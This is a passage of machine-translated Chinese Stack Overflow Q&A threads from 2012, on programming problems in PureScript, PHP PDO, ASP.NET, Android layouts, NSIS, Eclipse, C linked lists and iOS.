
instance mytwice1 :: Twice1 (a -> a) where
  twice1 f = f >>> f

instance mytwice2 :: TypeEquals a b => Twice2 (a -> b) where
  twice2 f = f >>> from >>> f

class Example a where
  transform :: Int -> a

instance exampleInt :: Example Int where
  transform n = n + 1

instance exampleChar :: Example Char where
  transform _ = 'x'

{--
-- will raise error
--   No type class instance was found for Main.Twice1 (Int -> t1)

apply1 x = twice1 transform x

-- to resolve error add type declaration
apply1 :: Int -> Int

--}

-- compiles without error and manual type declaration, has type Int -> Int automatically
apply2 x = twice2 transform x 
```

* * *

但是在 idris 你没有

```
module Main

import Prelude

interface Twice f where
  twice : f -> f

Twice (a -> a) where
  twice f = f . f

interface Example a where
  transform : Int -> a

Example Int where
  transform n = n + 1

Example Char where
  transform _ = 'x'

-- run in REPL to see that it derives properly:

-- $ idris src/15_EqualityConstraint_Twice_class.idr
-- *src/15_EqualityConstraint_Twice_class> :t twice transform
-- twice transform : Int -> Int

-- Summary:
-- in idris you dont need equality constaint to derive type of such functions properly 
```

# java - Kxml2 如何将 xml 转换为 wbxml？

> ID：11553708
> 
> 赞同：1
> 
> 时间：2012-07-19T03:56:06.527
> 
> 标签：java, activesync, kxml2, wbxml

我已经配置了 tag_tables。但是问题是命名空间没有发生转换。

有什么帮助吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T21:48:06.780

我没有为此使用 kxml2，但有一些[Java 代码](http://code.google.com/p/corporateaddressbook/source/browse/#svn/trunk/src/net/vivekiyer/GAL/wbxml)可以解决问题。

# objective-c - Xcode #ifdef DEBUG 无法正常工作

> ID：11553713
> 
> 赞同：2
> 
> 时间：2012-07-19T03:56:33.407
> 
> 标签：objective-c, debugging, ios5, xcode4

我在代码中添加了以下行。

```
#ifdef DEBUG
        //DEBUG only code
#endif 
```

我已经转到 xcode 中的项目-> 信息选项卡并设置“命令行构建使用”来调试和运行“if”中执行的代码片段的代码。问题是当我设置命令行构建用于发布和运行代码时。if 条件中的代码段仍然运行。我已将预处理器 DEBUG 宏设置为不带引号的 'DEBUG=1'。如何解决这个问题。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-19T05:00:33.037

语法表示“`#ifdef`已定义”，不考虑值；换句话说，如果它有任何值（0 或 1），它就会被定义。

您可能需要`#if`语法。这要求该*值*实际设置为 1。

# asp.net - ASP.NET WebMethod 可以在有和没有 Session 的情况下工作

> ID：11553715
> 
> 赞同：0
> 
> 时间：2012-07-19T03:56:41.677
> 
> 标签：asp.net, session, webmethod, http-status-code-401, unauthorized

我正在用 C# 制作一个 ASP.NET 网页。我发现如果网页在短时间内被单独放置，每当页面尝试调用 WebMethod 时，我就会开始收到 401 未经授权的错误。我认为这可能是由会话超时引起的。

我只在用户第一次进入这个页面时使用 Session 很短的时间，当我做一些后端缓存并使用 Session 来跟踪时。那时页面正在不断地访问后端进行更新，这将刷新会话。一旦完成，我不再需要任何会话状态。

是否有可能拥有一个无需会话状态即可工作的 WebMethod，但如果它存在，它能够找到并访问它吗？或者，如果它在调用 WebMethod 时自动创建了一个空会话，这也可以。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T05:58:23.927

好吧，如果我的理解是正确的，您应该将您的 Web 服务放在一个子文件夹中并将其配置为允许匿名用户：

您的典型根 web.config 如下所示：

```
<authentication mode="Forms">
  <forms loginUrl="~/Account/Login.aspx" timeout="2880">
  </forms>
</authentication>
<authorization>
  <deny users="*"/>
</authorization> 
```

在子文件夹中，创建一个新的 web.config 文件并覆盖授权设置：

```
<?xml version="1.0"?>
<configuration>
    <system.web>
      <authorization>
        <allow users="*"/>
      </authorization>
    </system.web>
</configuration> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T06:03:22.273

除了@Jupaol 给出的 ans 之外，
您还可以轻松地使用`Location`element of`web config` 像这样的东西

```
<configuration>
   <location path="Url_To_WebMethod">
      <system.web>
         <authorization>
            <allow users="*"/>
         </authorization>
      </system.web>
   </location>
</configuration> 
```

这将从您的网络方法中消除对身份验证的需要，然后您就可以使用它而无需任何`auth cookie`

# asp.net-mvc - 在 Asp.Net MVC 应用程序中传递 POCO

> ID：11553716
> 
> 赞同：0
> 
> 时间：2012-07-19T03:57:19.460
> 
> 标签：asp.net-mvc

我有一个 Asp.Net MVC 3 应用程序，我需要将 Viewmodel 传递给不同的视图，我想知道实现此目的的正确方法是什么。一旦用户登录并获取用户对象，我需要对 ViewUser、EditUser 等视图使用相同的用户对象。我目前在 @html.actionlink 方法中传递用户 ID（一旦用户成功登录）为objectroutes 并每次都从数据库中获取用户对象。

这是正确的方法吗？我不想使用会话。

谢谢 ！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-19T04:07:31.057

你为什么不想使用会话？它专为这种情况而设计......用于缓存用户登录期间所需的数据。

当视图更改用户对象（EditUser）时，只需在更新数据库的同时更新 Session。

# php - 本地主机 facebook 登录不适用于较低级别的 url

> ID：11553717
> 
> 赞同：1
> 
> 时间：2012-07-19T03:57:34.610
> 
> 标签：php, facebook, codeigniter, facebook-php-sdk, facebook-login

提前感谢您的阅读。

几年来，我一直在使用 facebook 登录（php 和 javascript sdk 方法），我正在开发的新应用程序面临一个特殊问题。

我的本地主机中有一个应用程序配置为虚拟目录，如下所示：

```
http://localhost/myapp/ 
```

在 facebook 上，我的应用程序的以下设置指向该 url：应用程序域、Facebook 登录网站、Facebook 上的应用程序（https 和 http）和移动网络。

当我执行登录过程并将redirect_uri 指向时`http://localhost/myapp/`，它工作正常，cookie 已设置，我可以对图形api 进行查询。

当我尝试使用另一个重定向 uri 时出现问题`http://localhost/myapp/user_controller/register`（将用户添加到数据库）。虽然它在 facebook 上配置的应用程序 url 内，但 SDK 会输出错误消息（OAuthException | 必须使用活动访问令牌来查询有关当前用户的信息。| 代码 2500）。

我想，要暂时解决这个问题，我必须去 facebook 应用页面：apps.facebook.com/myapp。每次我的 access_token 过期时我都必须这样做，而且由于这个应用程序不打算在 facebook 内，我认为这不是解决这个问题的最佳方法。

我希望我们能一起找到解决这个问题的好方法，这个问题可以帮助未来的开发人员。

我正在使用 CodeIgniter（我已经使用了大约一年）和 Facebook PHP SDK（直接从 github 官方 repo 下载）作为 CI 库。

再次感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T03:38:26.960

在身份验证期间，您绝不会收到该错误。

我很确定您的代码中有一个错误，无法在端点上交换`code`，因此您最终使用了无效的.`access_token``.../register``access_token`

# jsf - 修复在 tabview primefaces 3.2 中提交所有信息

> ID：11553718
> 
> 赞同：0
> 
> 时间：2012-07-19T03:57:47.867
> 
> 标签：jsf

我使用 primefaces 3.2 我有一个 tabview，当我在选项卡之间单击时，它会将 tabview 中的所有信息提交给服务器，即使我设置了 immediate="true" 但所有信息仍然提交给服务器。

```
<p:tabView activeIndex="0" id="tabView" dynamic="true" cache="false"> 
            <p:ajax immediate="true" event="tabChange"/>
            <p:tab id="tab1" title="Annex I.0">
                <ui:include src="/modules/center/I0.xhtml" />
            </p:tab>
            <p:tab id="tab2" title="Annex I.1">
                <ui:include src="/modules/center/I1.xhtml" />
            </p:tab>
</p:tabView> 
```

每个选项卡都有从 java bean 获取的内容。

那么在这种情况下如何不向服务器提交信息。对不起我的英语不好。

# python - 使用字符串变量作为变量名

> ID：11553721
> 
> 赞同：157
> 
> 时间：2012-07-19T03:58:15.513
> 
> 标签：python

> **可能重复：**
> [如何在 Python 中做变量变量？](https://stackoverflow.com/questions/1373164/how-do-i-do-variable-variables-in-python)

我有一个分配有字符串的变量，我想根据该字符串定义一个新变量。

```
foo = "bar"
foo = "something else"   

# What I actually want is:

bar = "something else" 
```

* * *

## 回答 #1

> 赞同：256
> 
> 时间：2012-07-19T04:01:42.813

您可以`exec`为此使用：

```
>>> foo = "bar"
>>> exec(foo + " = 'something else'")
>>> print bar
something else
>>> 
```

* * *

## 回答 #2

> 赞同：158
> 
> 时间：2012-07-19T04:05:05.813

使用字典会更快乐：

```
my_data = {}
foo = "hello"
my_data[foo] = "goodbye"
assert my_data["hello"] == "goodbye" 
```

* * *

## 回答 #3

> 赞同：111
> 
> 时间：2012-07-19T04:10:16.890

您可以使用`setattr`

```
name  = 'varname'
value = 'something'

setattr(self, name, value) #equivalent to: self.varname= 'something'

print (self.varname)
#will print 'something' 
```

但是，由于您应该通知对象接收新变量，因此这只适用于类或模块。

# php - PDO 警告和未定义方法 myclassname::bindParams()

> ID：11553728
> 
> 赞同：0
> 
> 时间：2012-07-19T03:59:18.963
> 
> 标签：php, oop, pdo

我重新开始了我之前正在做的一个项目。在我的 PHP 书籍和 Stack Overflow 上的一些人的帮助下，我能够摆脱我遇到的许多错误。

现在，我留下了一个警告和一个致命错误。我理解这两个错误，我只是不确定如何解决我遇到的错误。有人可以帮忙吗？我**不是**要求任何人编写代码或只是为我做所有事情，我只需要指出正确的方向。

这是警告，听起来我需要将 __construct 放在 uploadFile() 方法中的某个位置，但同样，对此不确定：

> 警告：PDO::prepare() [pdo.prepare]: SQLSTATE[00000]: No error: PDO constructor was not called in C:\xampp\htdocs\files\upload.php on line 23

第二，我完全不知道该怎么办。我意识到错误告诉我什么，我只是不知道从哪里开始修复它。这里是：

> 致命错误：在第 24 行调用 C:\xampp\htdocs\files\upload.php 中未定义的方法 upload::bindParam()

如果我可以提供更多信息可以使这个问题更容易回答，请告诉我，我会尽力为您获取。我很感激任何帮助！

**上传.php**

```
 <?php
error_reporting(E_ALL);
require('config.php');

class upload extends PDO
{
    public $conURL, $filename, $tmpname, $filesize, $filetype, $file;

    public function __construct($config) {
        $conURL = "mysql:host=" . $config['host'] . ";dbname=" . $config['db'];
        parent::__construct($conURL, $config['user'], $config['pass']);

    }       

    public function uploadFile() {
        if ($_FILES['file']['size'] >= 2000000) {
           echo "File is too large!"; 
        }
        else {
            $sth = $this->prepare("INSERT INTO uploads (name, type, size, file) VALUES (?, ?, ?, ?)");
            $sth->bindParam(1, $filename);
            $sth->bindParam(2, $filetype);
            $sth->bindParam(3, $filesize);
            $sth->bindParam(4, $file);
            $sth->execute();
        }
    }
}

$upload = new upload($config);

$upload->filename = $_FILES['file']['name'];
$upload->tmpname = $_FILES['file']['tmp_name'];
$upload->filesize = $_FILES['file']['size'];
$upload->filetype = $_FILES['file']['type'];    
$upload->file = $_FILES['file'];

$upload->uploadFile(); 
```

**配置文件**

```
<?php
$config = array(
        'host' => 'localhost', // db host
        'user' => 'root', // db user
        'pass' => '', //db pass
        'db' => 'files' // db name
); 
```

编辑：感谢这里的每个人，只剩下一个错误，如下所示：

> 致命错误：在第 43 行调用 C:\xampp\htdocs\files\upload.php 中未定义的方法 stdClass::uploadFile()

编辑 2：所有错误都已解决，但没有任何内容插入到数据库中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T04:07:19.207

好吧，两个人指出了另一个问题，但真正的重点是您正在调用 PDO 子类的 bindParam。这需要被`pdostatement`替换。尝试：

```
 $sth = $this->prepare("INSERT INTO uploads (name, type, size, file) VALUES (?, ?, ?, ?)");
        $sth->bindParam(1, $this->filename);
        $sth->bindParam(2, $this->filetype);
        $sth->bindParam(3, $this->filesize);
        $sth->bindParam(4, $this->file);
        $sth->execute(); 
```

当然，您还需要修复构造函数中的以下错误。

编辑：

我猜构造函数失败并抛出异常。因为 $this->conURL 为空。改变

```
$conURL = "mysql:host=" . $config['host'] . ";dbname=" . $config['db']; 
```

到

```
$this->conURL = "mysql:host=" . $config['host'] . ";dbname=" . $config['db']; 
```

另外我更改了我之前的答案，请参阅 bindparam() 的第二个参数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T04:03:30.200

您的构造函数应如下所示：

```
public function __construct($config) {
        $conURL = "mysql:host=" . $config['host'] . ";dbname=" . $config['db'];
        try {
            parent::__construct($conURL, $config['user'], $config['pass']);
        } catch (PDOException $e) {
            $e->getMessage();
        }
} 
```

甚至

```
public function __construct($config)
{
    $conURL = "mysql:host=" . $config['host'] . ";dbname=" . $config['db'];
    parent::__construct($conURL, $config['user'], $config['pass']);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T04:04:03.637

因为您正在扩展 PDO，所以

```
return new PDO($this->conURL, $config['user'], $config['pass']); 
```

应该

```
parent::__construct($this->conURL, $config['user'], $config['pass']); 
```

# parsing - FindLine 函数不查看所有行

> ID：11553729
> 
> 赞同：0
> 
> 时间：2012-07-19T03:59:30.303
> 
> 标签：parsing, installation, nsis

我正在使用 NSIS 函数**LineFind**。

**我的问题：**函数 LineFind 只搜索文件的第一行然后停止。它直到最后才进入文件的下一行。该函数不是要在文件的每一行中搜索我的 TargetLine 吗？

如何让 LineFind 搜索每一行而不仅仅是第一行？

```
Function FindLineCallback
    # Only ever prints out the first line and never runs this function again
    DetailPrint "LINE: $R9"

    ...Unrelated code to check line
FunctionEnd

Function FindLine
    # TOP = Top of stack
    # T-2 = mDir
    # T-1 = mFile
    # TOP = targetStr

    Pop $R8  # targetStr
    Pop $R7  # mFile
    Pop $R6  # mDir 

    ${LineFind} "$R6\$R7" "" "1:-1" "FindLineCallback"

FunctionEnd 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T06:35:48.150

找到了答案：我只需要在回调函数末尾推送一个数字值来“表示”我想继续寻找

```
Function FindLineCallback
    DetailPrint "LINE: $R9"

    Push 2
FunctionEnd 
```

# java - 将 Android 屏幕一分为二

> ID：11553733
> 
> 赞同：3
> 
> 时间：2012-07-19T03:59:53.363
> 
> 标签：java, android, android-linearlayout, latitude-longitude

我最近开始使用 Android。我对Android没有太多经验。这是我第一次使用 Android。我需要将屏幕分成两半，然后执行一些任务。

1.  将屏幕一分为二后，在下半部分（表示下半部分），我需要创建一个名为`Latitude`then 的标签，该标签对应于`Textbox`将显示当前纬度值的 a 和另一个命名`Longitude`并对应于另一个标签`Textbox`并将显示当前的标签经度值。

我开始研究这个，并且取得了一些进展——下面是我目前用来将屏幕分成两半的 XML 文件。

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical" >

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_weight="1.8"
        android:background="#000000" />

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_weight="1"
        android:background="#000000" >

        <!-- Latitude Label -->

        <TextView
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:text="Latitude"
            android:textColor="#372c24" />

        <EditText
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:layout_marginBottom="20dip"
            android:layout_marginTop="5dip"
            android:singleLine="true" />
        <!-- Longitude Label -->

        <TextView
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:text="Longitude"
            android:textColor="#372c24" />

        <EditText
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:layout_marginTop="5dip"
            android:password="true"
            android:singleLine="true" />
    </LinearLayout>

</LinearLayout> 
```

我的问题是-

1.  使用上述 XML 文件后，我无法在 Android 屏幕上正确看到我的`both label`和，我的 XML 文件中是否缺少任何内容？`both textbox`
2.  其次，如何在相应的文本框中显示当前的经纬度值。

任何帮助将不胜感激，因为我是 Android 世界的新手。

更新：-下面是我在油漆中制作的图表，我想要这样的东西。![在此处输入图像描述](../Images/b4393f756903703661c7532a7cb397bd.png)

如果你看屏幕，它被分成两部分，在下半部分，有两个标签（纬度和经度），应该是这样的，每个标签前面都有一个文本框保存相应的纬度和经度值。

**更新代码：-**对于当前位置-

```
public class MainActivity extends Activity implements LocationListener {
    private TextView latituteField;
    private TextView longitudeField;
    private LocationManager locationManager;
    private String provider;

    private static final String TAG = "CurrentLocation";

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        latituteField = (TextView) findViewById(R.id.lat1);
        longitudeField = (TextView) findViewById(R.id.lat2);

     // Get the location manager
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        // Define the criteria how to select the location provider -> use
        // default
        Criteria criteria = new Criteria();
        provider = locationManager.getBestProvider(criteria, false);
        locationManager.requestLocationUpdates(provider, 0, 0, this);
        Location location = locationManager.getLastKnownLocation(provider);
        onLocationChanged(location);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        locationManager.removeUpdates(this);
    }

    @Override
    public void onLocationChanged(Location location) {
       if (location != null) {
           System.out.println("Provider " + provider + " has been selected.");
           int lat = (int) (location.getLatitude());
           int lng = (int) (location.getLongitude());
           Log.v(TAG, lat+ " "+ lng);
           latituteField.setText(String.valueOf(lat));
           longitudeField.setText(String.valueOf(lng));
       } else {
           latituteField.setText("Provider not available");
           longitudeField.setText("Provider not available");
       }
    }

    @Override
    public void onProviderDisabled(String provider) {
        // TODO Auto-generated method stub

    }

    @Override
    public void onProviderEnabled(String provider) {
        // TODO Auto-generated method stub

    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {
        // TODO Auto-generated method stub

    }
} 
```

但是下面的代码没有在相应的文本框中显示任何纬度或经度值？我做错了什么吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-19T04:10:21.943

> “使用上述 XML 文件后，我无法在 Android 屏幕上正确看到我的两个标签和两个文本框，我的 XML 文件中是否缺少任何内容？”

看来，您的`LinearLayout`标签可能弄乱了。

看看这是否更接近您正在寻找的内容：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:background="@android:color/black" >

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:layout_weight="1"
        android:orientation="vertical" >

        <!-- currently empty -->

    </LinearLayout>

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:layout_weight="1"
        android:orientation="vertical" >

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:layout_weight="1"
            android:orientation="horizontal" >

            <!-- Latitude Label -->

            <TextView
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:text="Latitude"
                android:textColor="#372c24" />

            <EditText
                android:layout_width="fill_parent"
                android:layout_height="wrap_content"
                android:layout_marginBottom="20dip"
                android:layout_marginTop="5dip"
                android:layout_weight="0.35"
                android:singleLine="true"
                android:text="test1" />
        </LinearLayout>

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:layout_weight="1"
            android:orientation="horizontal" >

            <!-- Longitude Label -->

            <TextView
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:text="Longitude"
                android:textColor="#372c24" />

            <EditText
                android:layout_width="fill_parent"
                android:layout_height="wrap_content"
                android:layout_marginTop="5dip"
                android:layout_weight="0.35"
                android:password="true"
                android:singleLine="true"
                android:text="test2" />
        </LinearLayout>
    </LinearLayout>

</LinearLayout> 
```

* * *

图片

![在此处输入图像描述](../Images/1dcfd01acbf5ec04750a904c8d15c990.png)

* * *

> “其次，如何在相应的文本框中显示当前的经纬度值。”

你有什么尝试？

您需要获取当前的纬度/经度。然后只需将文本设置在`EditText`.

# php - 如何修复成功上传文件的 503 错误？

> ID：11553734
> 
> 赞同：1
> 
> 时间：2012-07-19T03:59:54.847
> 
> 标签：php, wordpress, ftp

我正在将自定义 wordpress 主题文件从 mac 上传到远程服务器。我在 Cyber​​duck 中使用 SFTP，将各种文件类型（php、css、less、png、jpg、gif；典型的网站文件）从我的本地机器传输到远程主机，并且随机文件一旦返回 503 错误上传。

我尝试删除返回错误的文件，然后使用不同的客户端重新上传，但这不起作用。我在我的两个 FTP 客户端中的任何一个中刷新远程文件列表，文件就在那里。在等待查看是否只是服务器忙后，我在浏览器中刷新网页......什么都没有。同样的错误。

似乎随机的 CSS 和图像文件在服务器上返回 503 错误，我不知道如何解决这个问题。有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T04:21:46.270

建议您单独上传这些文件。是否会因为您的 css/images 文件太小而导致 ftp 服务器太忙而无法处理请求而导致上传速度过快？

# perl - 如何将输入从脚本传递到命令行

> ID：11553739
> 
> 赞同：2
> 
> 时间：2012-07-19T04:00:49.843
> 
> 标签：perl, command-line, buffer-overflow, fuzzing

我是脚本、模糊测试和缓冲区溢出的新手。不过，我了解它们背​​后的基本概念。

我正在寻找一种将输入从脚本（我正在考虑 perl）传递到命令行的方法。

我正在尝试为缓冲区溢出创建一个模糊器。我有一个从命令行获取输入的基本 C 程序

我需要一个脚本，我可以在命令行上将模式传递给这个外部程序。

任何帮助，将不胜感激。谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T04:07:55.377

您可以为输入创建一个文件，其中包含 11 行（最后一行只是一个空行，用于模拟最后一个命令行输入的 enter 键），然后将此文件重定向到 C 程序：

```
 ./c_program < file_with_10_inputs 
```

您可以将上面的行保存为包装脚本（例如，auto_exec.sh）并在 perl 中执行：

```
 system("sh auto_exec.sh"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T07:20:45.503

我认为你必须处理外部进程的标准输入和标准输出，所以最好使用像[IO::Async](http://search.cpan.org/perldoc?IO%3a%3aAsync%3a%3aProcess)这样的模块，这对你有很大帮助。

# java - 在eclipse Android应用程序中Java调试Java

> ID：11553740
> 
> 赞同：0
> 
> 时间：2012-07-19T04:01:10.490
> 
> 标签：java, android, eclipse

我是使用 eclipse 的新手，我的第一个问题是弄清楚错误消息的真正含义。尝试在 Android 编程上动手，并尝试效仿。但是当代码构建时，我有 Java 错误阻止我的代码运行，并且希望能在翻译这方面提供一些帮助，所以它在某种程度上对我来说是有意义的。主要问题似乎在我的项目附带的自动生成的 Activity.Java 文件中，但不完全确定我应该做什么。提前致谢。

```
Exception occurred while saving project preferences: /com.example.android.nfc.simulator.FakeTagsActivity/.settings/org.eclipse.jdt.core.prefs.

org.eclipse.core.internal.resources.ResourceException: A resource already exists on disk 'C:\Development\JavaWorkSpace\UnitedNFCApp\UnitedNFCApp\.settings'.
    at org.eclipse.core.internal.resources.Folder.assertCreateRequirements(Folder.java:47)
    at org.eclipse.core.internal.resources.Folder.create(Folder.java:95)
    at org.eclipse.core.internal.resources.ProjectPreferences$1.run(ProjectPreferences.java:566)
    at org.eclipse.core.internal.resources.Workspace.run(Workspace.java:2344)
    at org.eclipse.core.internal.resources.ProjectPreferences.save(ProjectPreferences.java:590)
    at org.eclipse.core.internal.preferences.EclipsePreferences.internalFlush(EclipsePreferences.java:465)
    at org.eclipse.core.internal.resources.ProjectPreferences.flush(ProjectPreferences.java:350)
    at org.eclipse.jdt.internal.core.JavaProject.setOption(JavaProject.java:2953)
    at com.android.ide.eclipse.adt.internal.project.ProjectHelper.checkAndFixCompilerCompliance(ProjectHelper.java:438)
    at com.android.ide.eclipse.adt.internal.project.ProjectHelper.fixProjectClasspathEntries(ProjectHelper.java:343)
    at com.android.ide.eclipse.adt.internal.project.ProjectHelper.fixProject(ProjectHelper.java:261)
    at com.android.ide.eclipse.adt.internal.wizards.newproject.NewProjectCreator.createEclipseProject(NewProjectCreator.java:775)
    at com.android.ide.eclipse.adt.internal.wizards.newproject.NewProjectCreator.createProjectAsync(NewProjectCreator.java:620)
    at com.android.ide.eclipse.adt.internal.wizards.newproject.NewProjectCreator.access$0(NewProjectCreator.java:553)
    at com.android.ide.eclipse.adt.internal.wizards.newproject.NewProjectCreator$2.execute(NewProjectCreator.java:365)
    at org.eclipse.ui.actions.WorkspaceModifyOperation$1.run(WorkspaceModifyOperation.java:106)
    at org.eclipse.core.internal.resources.Workspace.run(Workspace.java:2344)
    at org.eclipse.ui.actions.WorkspaceModifyOperation.run(WorkspaceModifyOperation.java:118)
    at org.eclipse.jface.operation.ModalContext$ModalContextThread.run(ModalContext.java:121)

eclipse.buildId=I20120608-1400
java.version=1.7.0_05
java.vendor=Oracle Corporation
BootLoader constants: OS=win32, ARCH=x86, WS=win32, NL=en_US
Framework arguments:  -product org.eclipse.epp.package.jee.product
Command-line arguments:  -os win32 -ws win32 -arch x86 -product org.eclipse.epp.package.jee.product 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-08-30T06:10:10.543

下面的方法对我有用：

1.  删除该文件夹中的`.settings`文件夹或`org.eclipse.jdt.core.prefs`文件。
2.  重启日食
3.  如果您的项目中的错误仍然存​​在，您需要找到每个有错误的类并导入正确的自动生成的`R`类。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-05T19:39:17.230

1.您可能有 JAVA_HOME 环境变量的问题，您必须通过单击工具栏上的运行配置选项在 Eclipse 中添加它，该选项打开一个名为“运行配置”的弹出窗口 2.在 Java 应用程序过滤器下找到环境选项卡并添加变量 - JAVA_HOME加上值 -c:\Java\jdk 或 jdk 的路径。

然后重启 Eclipse

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T04:20:12.867

请更新您的 JDK 和 ADT 请检查以下链接 [http://developer.android.com/sdk/installing/installing-adt.html](http://developer.android.com/sdk/installing/installing-adt.html)

# c - 我是否覆盖了我的链接列表？

> ID：11553742
> 
> 赞同：0
> 
> 时间：2012-07-19T04:01:44.020
> 
> 标签：c, pointers, linked-list

*免责声明：这是一个家庭作业问题。应该很明显，我正在尝试自己解决它。我似乎遇到了一个我无法弄清楚的问题，因此我们将不胜感激。*

我需要散列一组单词，并将其插入到链表数组中。因此，如果 3 个不同的单词具有哈希 38，则在数组 [38] 处，我需要一个包含 3 个单词的链表。

我正在使用这个结构

```
struct Word {
    char* word;
    struct Word* next;
}; 
```

哈希后，我将它插入到数组中，如下所示：

```
struct Word* table[1000];   // array of linked-lists

char word[128];
while(fgets(word, sizeof(word), dict) != NULL) {
    hashValue = hashWord(word, strlen(word));        

    struct Word *newWord = malloc(sizeof(struct Word));
    newWord->word = word;           

    if (table[hashValue] == NULL) {
        table[hashValue] = newWord;             
    } else {   // at index hashValue, table already contains at least one element
        // insert new word as first element of linked-list
        newWord->next = table[hashValue];
        table[hashValue] = newWord;         
    }

} 
```

我知道大约有 5 个单词的哈希值为 38，但是当我打印它们时，我得到了 5 次相同的单词：

```
struct Word* foo = table[38];

while (foo->next != NULL) {
    printf("%s", foo->word); // prints the same word every time
    foo = foo->next;
} 
```

似乎我在某个时候覆盖了我的链接列表，但我不知道在哪里。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-19T04:06:20.637

```
while(fgets(word, sizeof(word), dict) != NULL) {
    ...
    newWord->word = word; 
```

问题是您要替换 的内容`word`，这是存储在每个`newWord`.

您`Word`每次都使用此行在堆上分配一个新结构：

```
struct Word *newWord = malloc(sizeof(struct Word)); 
```

但这只会为`Word`结构本身分配内存；该`Word`结构包含一个`char *word`— 即指向一个字符（或以 NUL 结尾的字符串，在这种情况下）的指针，但它实际上不包含字符串本身的任何空间。

现在，您需要为字符串显式分配内存。尝试这个：

```
newWord->word = strdup(word); 
```

这会将*副本*`word`放入每个`Word`结构中。在循环`fgets()`中调用 next时，不会覆盖此副本。`while`请记住堆栈分配的字符数组：

```
char word[128]; 
```

仅在此函数执行时有效；如果您希望它在函数调用之外存在，则必须在堆上分配一些东西（使用`malloc()`，或使用它的东西，例如）。`strdup()`

完成后，不要忘记释放每个 s 之前`free()`的s 。`char *word``Word*`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T04:06:11.803

您正在覆盖单词数组。您只存储指向数组的指针，但数组会被每个新单词覆盖。您需要单独的内存来保存每个单词。

# iphone - iOS - 使用键盘“下一步”按钮更改 ViewController？

> ID：11553743
> 
> 赞同：0
> 
> 时间：2012-07-19T04:01:54.547
> 
> 标签：iphone, objective-c, ios, cocoa-touch, keyboard

我注意到可以使用 iOS 键盘右下角的 done/next/return 键触发操作并在文本字段中移动。是否可以使用该按钮更改视图或触发 segue？

例如，能够在 UITextField 中输入内容，然后只需点击“下一步”即可移动到下一个视图控制器，而不必使用单独的按钮或导航项，这将是一件很酷的事情。

可能是一个愚蠢的问题，但我一直在想是否有可能。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T04:08:08.557

```
- (BOOL)textFieldShouldReturn:(UITextField *)textField
{
    //Next button was pressed
    //Push some viewcontroller here
    return YES;
} 
```

确保将 UITextField 的委托设置为 self

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T04:11:06.827

有可能的。如果是 UITextField，可以实现 textFieldShouldReturn:。如果是 UITextView，则实现 textView:shouldChangeTextInRange:replacementText:，并在替换文本中查找 \n。

在任何一种情况下，您都可以执行转场、导航或模态推送等。

# java - 使用事件处理程序更改对象参数

> ID：11553744
> 
> 赞同：1
> 
> 时间：2012-07-19T04:01:58.817
> 
> 标签：java

我正在尝试创建一个对象并将其添加到我创建的数组中，作为我构造的参数 GUI 对象。出于某种原因，我不断收到***TheDates cannot be resolved to a Variable***。

正在构造的对象：

```
public static void main(String[] args)
{
    DateDriver myDateFrame = new DateDriver();
}

//Constructor
public DateDriver()
{
    outputFrame = new JFrame();
    outputFrame.setSize(600, 500);
    outputFrame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    String command;
    Date [] theDates = new Date[100];    //this is the array I am having issues with
    int month, day, year;

    ...
} 
```

这就是我对 theDates 的问题所在：

```
public void actionPerformed(ActionEvent e) 
{    //The meat and Potatoes
     if ( e.getSource() == arg3Ctor) 
     {
        JOptionPane.showMessageDialog(null, "3 arg Constructor got it");
        int month = Integer.parseInt(monthField.getText());
        int day = Integer.parseInt(dayField.getText());
        int year = Integer.parseInt(yearField.getText());
